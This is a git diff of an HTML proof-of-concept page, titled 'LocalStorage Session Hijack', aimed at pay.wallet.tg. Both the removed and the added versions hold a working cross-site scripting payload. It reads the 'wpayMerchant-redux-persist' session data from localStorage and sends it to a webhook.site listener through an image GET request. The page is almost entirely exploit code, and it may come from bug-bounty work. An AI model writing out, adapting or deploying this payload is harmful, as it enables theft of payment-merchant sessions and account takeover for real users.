@@ -6,28 +6,21 @@
 </head>
 <body>
   <h2>Proof of Concept: LocalStorage Session Hijack</h2>
-  <p>This page simulates exfiltrating localStorage data (e.g. wpayMerchant-redux-persist) via an image request.</p>
+  <p>If this page is injected into the context of <code>pay.wallet.tg</code>, it will exfiltrate the session data via a GET request.</p>
 
   <script>
-    // Replace this with your own webhook.site ID or listener
-    const webhookURL = "https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25";
-
-    // Simulate attacker reading localStorage
-    const stolenData = localStorage.getItem("wpayMerchant-redux-persist");
-    const encodedData = encodeURIComponent(stolenData);
-
-    // Exfiltrate using image-based GET request
-    const img = new Image();
-    img.src = webhookURL + "?data=" + encodedData;
-    document.body.appendChild(img);
-
-    // XSS payload to exfiltrate localStorage from pay.wallet.tg
-(function(){
-  const stolen = localStorage.getItem("wpayMerchant-redux-persist");
-  const img = new Image();
-  img.src = "https://webhook.site/YOUR-ID?data=" + encodeURIComponent(stolen);
-})();
-
+    (function () {
+      const webhookURL = "https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25"; // ✅ your actual webhook
+      const stolenData = localStorage.getItem("wpayMerchant-redux-persist");
+      if (stolenData) {
+        const encoded = encodeURIComponent(stolenData);
+        const img = new Image();
+        img.src = webhookURL + "?data=" + encoded;
+        document.body.appendChild(img);
+      } else {
+        console.warn("No session data found in localStorage.");
+      }
+    })();
   </script>
 </body>
 </html>
